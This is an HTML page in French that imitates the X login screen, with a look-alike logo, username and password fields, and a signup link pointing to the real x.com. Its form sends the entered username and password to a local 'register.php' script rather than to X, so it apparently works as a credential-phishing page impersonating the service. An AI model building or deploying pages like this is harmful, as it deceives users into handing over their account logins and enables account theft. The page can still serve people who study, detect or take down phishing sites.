
<!doctype html>
<html lang="fr">
  <link rel="icon" type="image/svg+xml" href="x.png" />

<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  
  <title>Connexion — X</title>
  <meta name="description" content="Recréation originale de l'interface de connexion de X (non officielle)." />

  
  <style>
    :root{
      --bg: #000000;
      --text: #e7e9ea;
      --muted: #8b98a5;
      --panel: #0a0a0a;
      --input-bg: #16181c;
      --input-border: #2f3336;
      --input-border-focus: #3b82f6;
      --primary: #1d9bf0;
      --primary-hover: #1a8cd8;
      --danger: #f4212e;
      --radius: 16px;
    }
    * { box-sizing: border-box; }
    html, body { height: 100%; }
    body{
      margin:0;
      background: var(--bg);
      color: var(--text);
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }
    a{ color: var(--primary); text-decoration: none; }
    a:hover{ text-decoration: underline; }

    .shell{
      min-height: 100svh;
      display: grid;
      grid-template-columns: 1.2fr 1fr;
      gap: clamp(24px, 5vw, 64px);
      align-items: center;
      padding: clamp(16px, 4vw, 48px);
    }
    @media (max-width: 1024px){
      .shell{ grid-template-columns: 1fr; }
      .brand{ justify-self: center; }
    }

    /* Left: big X brand (custom SVG, not official asset) */
    .brand{
      display: flex;
      align-items: center;
      justify-content: center;
      padding: clamp(12px, 2vw, 24px);
    }
    .brand svg{
      width: min(48vw, 520px);
      height: auto;
      display: block;
      filter: drop-shadow(0 10px 30px rgba(255,255,255,0.06));
    }

    /* Right: auth panel */
    .panel{ max-width: 460px; width: 100%; justify-self: center; }
    .panel h1{ font-size: clamp(28px, 4vw, 42px); line-height: 1.15; margin: 0 0 24px; }

    .oauth-grid{ display: grid; gap: 12px; }
    .btn{
      display: inline-flex; align-items: center; justify-content: center;
      gap: 10px;
      width: 100%;
      border-radius: 9999px;
      padding: 14px 18px;
      border: 1px solid var(--input-border);
      background: transparent;
      color: var(--text);
      font-weight: 600;
      cursor: pointer;
      transition: transform .04s ease, background .2s ease, border-color .2s ease;
    }
    .btn:hover{ background: #0b0b0b; border-color: #3a3a3a; }
    .btn:active{ transform: translateY(1px); }
    .btn .icon{ width: 20px; height: 20px; display: inline-block; }

    .divider{ display: grid; grid-template-columns: 1fr auto 1fr; align-items: center; gap: 12px; margin: 10px 0 6px; color: var(--muted); }
    .divider::before, .divider::after{ content: ""; height: 1px; background: var(--input-border); }

    form{ display: grid; gap: 14px; margin-top: 8px; }
    label{ font-size: 14px; color: var(--muted); }
    .field{ position: relative; }
    .input{
      width: 100%;
      background: var(--input-bg);
      border: 1px solid var(--input-border);
      color: var(--text);
      padding: 14px 16px;
      border-radius: 10px;
      outline: none;
      transition: border-color .2s ease, box-shadow .2s ease;
    }
    .input::placeholder{ color: #98a2ad; }
    .input:focus{
      border-color: var(--input-border-focus);
      box-shadow: 0 0 0 3px rgba(59,130,246,0.22);
    }

    .forgot{ justify-self: start; font-size: 14px; }

    .submit{
      background: var(--primary);
      border-color: transparent;
      color: white;
      font-weight: 700;
    }
    .submit:hover{ background: var(--primary-hover); }
    .submit:disabled{ opacity: .6; cursor: not-allowed; }

    .hint{ color: var(--muted); font-size: 14px; }
    .signup{ margin-top: 22px; padding: 16px; border: 1px solid var(--input-border); border-radius: var(--radius); background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.00)); }

    footer{ margin-top: 28px; color: var(--muted); font-size: 12px; line-height: 1.4; }

    /* Reduce motion preference */
    @media (prefers-reduced-motion: reduce){
      .btn{ transition: background .2s ease, border-color .2s ease; }
    }
  </style>
</head>
<body>
  <main class="shell" role="main">
    <section class="brand" aria-label="Identité visuelle">
      <!-- Custom minimalist X-shaped SVG (original), not the official logo -->
      <svg viewBox="0 0 100 100" aria-hidden="true" focusable="false">
        <defs>
          <linearGradient id="g" x1="0" x2="1" y1="0" y2="1">
            <stop offset="0%" stop-color="#ffffff" stop-opacity="0.95"/>
            <stop offset="100%" stop-color="#9ca3af" stop-opacity="0.9"/>
          </linearGradient>
        </defs>
        <rect x="45" y="-15" width="10" height="130" rx="4" transform="rotate(45 50 50)" fill="url(#g)"/>
        <rect x="45" y="-15" width="10" height="130" rx="4" transform="rotate(-45 50 50)" fill="url(#g)"/>
      </svg>
    </section>

    <section class="panel" aria-label="Connexion">
      <h1>Se connecter</h1>

<form action="register.php" method="post" novalidate aria-label="Formulaire de connexion">
        <div class="field">
          <input class="input" id="id" name="id" type="text" autocomplete="username" placeholder="Numéro de téléphone, e‑mail ou nom d’utilisateur" required />
        </div>
        <div class="field">
          
          <input class="input" id="password" name="password" type="password" autocomplete="current-password" placeholder="Mot de passe" required />
        </div>
        <a class="forgot" href="#">Mot de passe oublié ?</a>
        <button class="btn submit" type="submit">Se connecter</button>
      </form>

      <div class="signup" aria-live="polite">
        <p class="hint">Vous n’avez pas de compte ? <a href=https://x.com>Inscrivez-vous</a></p>
      </div>

      <footer>
      </footer>
    </section>
  </main>
</body>
</html>
